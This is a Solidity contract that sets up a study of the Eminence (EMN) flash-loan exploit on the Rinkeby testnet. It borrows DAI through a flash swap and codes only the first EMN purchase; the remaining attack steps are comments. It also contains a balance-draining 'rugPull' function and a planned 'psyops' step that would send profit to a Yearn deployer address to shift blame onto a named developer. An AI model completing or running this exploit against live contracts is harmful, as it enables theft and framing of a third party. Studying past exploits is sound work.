pragma solidity ^0.5.16;

import "./UniswapFlashSwapper.sol";

// EMN interface functional signatures
contract EminenceCurrencyEMN {
  function addNPC(address _npc) external;
  function revokeNPC(address _npc) external;
  function addGM(address _gm) external;
  function revokeGM(address _gm) external;
  function award(address _to, uint _amount) external;
  function claim(address _from, uint _amount) external;
  function buy(uint _amount, uint _min) external returns (uint _bought);
  function sell(uint _amount, uint _min) external returns (uint _bought);
}

contract EmnExploitStudy is UniswapFlashSwapper {

    address RINKEBY_DAI = address(0xc7AD46e0b8a400Bb3C915120d284AafbA8fc4735);

    function flashSwap() external {

        // initialise flash paramters
        address tokenBorrow = RINKEBY_DAI; // flash borrowing rinkeby DAI
        uint256 flashAmount = 10000000000000000000000; // the actual exploit involved flashing $15M worth of DAI but we're using 10k here for demo purposes
          // 1000000000000000000000000 = 1M DAI
        address tokenPay = RINKEBY_DAI; // repaying flash swap with rinkeby DAI
        bytes memory userData = "";

        // execute flash swap and the atomic minting/burning of EMN/eAAVE in between
        startSwap(tokenBorrow, flashAmount, tokenPay, userData);

        // now that the flash loan has been repaid, clean up loose ends
        executePsyOps();
    }

    // Mid-flash swap logic i.e. what you do with the temporarily acquired flash liquidity
    function execute(address _tokenBorrow, uint _amount, address _tokenPay, uint _amountToRepay, bytes memory _userData) internal {

        address EmnAddress = address(0xbf17593c6B3Bf351cb8C33be6e753aF8eD41Fe01);
        address eAaveAddress = address(0xf9325bD4B7249fA70ce37fa8d80426a27675a49e);
        uint256 emnBuyAmount = 1000000000000000000;

        EminenceCurrencyEMN emn = EminenceCurrencyEMN(EmnAddress);
        IERC20 dai = IERC20(RINKEBY_DAI);
        dai.approve(EmnAddress, emnBuyAmount);
        uint emnBought = emn.buy(emnBuyAmount, 0); // use DAI to mint EMN
        // approve DAI on EMN contract
        // Mint EMN with all available flash liquidity
        // approve eAAVE on EMN contract
        // burn half of EMN for eAAVE
        // burn other half of EMN back into DAI
        // mint EMN from eAAVE
        // burn remainder EMN back into DAI
    }

    // @notice Simple getter for convenience while testing
    function getBalanceOf(address _input) external view returns (uint) {
        if (_input == address(0)) {
            return address(this).balance;
        }
        return IERC20(_input).balanceOf(address(this));
    }

    // withdraw entire token balance
    function rugPull() external {
        IERC20 dai = IERC20(RINKEBY_DAI);
        dai.transfer(msg.sender, dai.balanceOf(address(this)));
    }

    // but IDK tho, might be psyops
    function executePsyOps() internal {
        // transfer half of post-loan repayment net profit to the 'Yearn: Deployer' contract to divert attention to Andre
    }

}
